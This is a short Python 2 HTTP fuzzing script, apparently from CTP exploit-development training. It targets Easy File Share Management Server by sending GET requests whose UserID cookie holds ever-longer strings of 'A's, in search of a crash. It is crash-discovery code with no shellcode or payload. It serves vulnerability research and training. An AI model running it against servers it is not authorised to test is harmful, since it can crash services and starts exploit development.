#!/usr/bin/python

#
# This python script is to be used for HTTP fuzzing
# I created it during following CTP training
# It is designed for the Easy File Share Management Server
import socket
import os
import sys
import time
#

#
# Six arguments, including the script itself, ask me how I know
#
if len(sys.argv) != 6:
    print "[-] Usage: ./http_fuzzer <ip> <port> <url> <max size> <interval>\n" 
    print "[-] Example: ./http_fuzzer 192.168.1.75 80 </vfolder.ghp> 2000 25\n"
    print "[-] Max size is the largest payload to be sent (2000 bytes)\n"
    print "[-] Interval is how much it will increase with each pass, starting from 1\n"
    print "[-] Try Harder!\n"
    sys.exit()


print "[-] Hello, looks like you survived the parameter quiz!\n"
print "[-] This script is designed to fuzz Easy File Share Management\n"
print "[-] You can change it to something else if you want!\n"
print "[-] This is hardcoded to fuzz the UserID portion of the Cookie\n"
time.sleep(2)
#
# Guess how many times I mixed ip and url?
#
ip = sys.argv[1]
port = int(sys.argv[2])
url = sys.argv[3]
size = int(sys.argv[4])
interval =int(sys.argv[5])

#
# Port, Size and interval (above) need to be expressed as integers
#

# Define the variable "crash"

crash=["A"]
#
# Size of loop depends on max / increment. No idea what that will be. It is driven by user input!
#
loop=1

# Define cycle (max / interval) to make the while loop work
cycle=int(size/interval)

while len(crash) <=cycle:
    crash.append("A"*loop)
    loop=loop+interval

for string in crash:
    #
    # This is what the GET form looks like in WireShark
    # Notice the ; following the fuzz string dude!
    #
    buffer="GET " + url + " HTTP/1.1\r\n"
    buffer+="User-Agent: Mozilla/4.0 (Windows NT 10.0) Java/1.6.0_03\r\n"
    buffer+="Host:" + ip + ":" + str(port) + "\r\n"
    buffer+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer+="Accept-Language: en-US\r\n"
    buffer+="Accept-Encoding: gzip, deflate\r\n"
    buffer+="Referer: http://192.168.1.75/\r\n"
    buffer+="Cookie: SESSIONID=6771; UserID=" + string + "; PassWD=;\r\n"
    buffer+="Connection: keep-Alive\r\n\r\n"
    print "[-] Here we going, sending a bunch of A's! %s bytes \n\n" %len(string)

    expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
    expl.connect((ip, port))
    expl.send(buffer)
    expl.close
    time.sleep(1)

    # Spoiler, if you want to watch in WireShark, filter by tcp.port not protocol
    # Ask me how I know 

print "[-] Fuzz Cycle Complete\n"

exit()
